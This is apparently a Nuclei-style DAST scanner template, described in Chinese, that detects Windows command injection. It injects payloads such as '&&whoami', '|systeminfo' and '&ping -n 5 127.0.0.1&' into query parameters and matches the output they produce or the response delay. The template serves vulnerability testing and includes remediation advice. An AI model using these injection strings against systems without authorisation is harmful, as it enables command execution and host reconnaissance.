id: windows-command-injection

info:
  name: Windows 命令注入 - 通用检测（DAST）
  author: Jaenact
  severity: high
  description: |
    Windows 命令注入发生在应用把用户输入拼接到 `cmd.exe`、PowerShell 或系统命令参数中，攻击者可通过 `&`、`&&`、`|`、`||` 等分隔符执行额外命令。模板用 `dir`、`whoami`、`systeminfo`、`ipconfig` 和 `ping` 延时载荷替换查询参数，并通过 Windows 命令输出或响应延时确认执行。
  impact: |
    - 攻击者可在 Windows 主机上执行任意命令，读取文件、创建账户、下载载荷、关闭防护或进一步提权。
    - 若应用运行在域环境或高权限服务账户下，漏洞可能导致域凭据泄露和横向移动。
  remediation: |
    - 不要把用户输入传入 `cmd.exe` 或 PowerShell；使用安全 API、固定参数数组和严格白名单。
    - 以低权限账户运行应用，限制出站网络和脚本执行策略，并对异常命令调用进行审计。
  reference:
    - https://owasp.org/www-community/attacks/Command_Injection
    - https://cwe.mitre.org/data/definitions/78.html
    - https://capec.mitre.org/data/definitions/88.html
    - https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
  metadata:
    verified: true
    max-request: 14
  tags: cmdi,dast,rce,windows,fuzz,vuln

http:
  - pre-condition:
      - type: dsl
        dsl:
          - 'method == "GET"'

    payloads:
      injection:
        # dir output
        - "|dir"
        - "&dir"
        - "&&dir"
        - "||dir"
        - "|dir C:\\"
        - "&&dir C:\\"
        # identity
        - "|whoami"
        - "&&whoami"
        # system enumeration
        - "|systeminfo"
        - "&&systeminfo"
        - "|ipconfig"
        - "&&ipconfig"
        # time-based
        - "&ping -n 5 127.0.0.1&"
        - "&&ping -n 5 127.0.0.1&&"

    fuzzing:
      - part: query
        type: replace
        mode: single
        fuzz:
          - "{{injection}}"

    stop-at-first-match: true
    matchers-condition: or
    matchers:
      - type: regex
        name: dir-output
        part: body
        regex:
          - '(?mi)Directory of [A-Z]:\\\\'
          - '(?mi)Volume in drive [A-Z]'

      - type: regex
        name: systeminfo-output
        part: body
        regex:
          - '(?mi)^OS Name:\s+'
          - '(?mi)^Host Name:\s+'

      - type: regex
        name: ipconfig-output
        part: body
        regex:
          - '(?mi)Windows IP Configuration'

      - type: regex
        name: whoami-output
        part: body
        regex:
          - '(?mi)^[a-z][-a-z0-9]*\\\\[a-z][-a-z0-9]*$'

      - type: dsl
        name: time-based
        dsl:
          - 'duration >= 4'
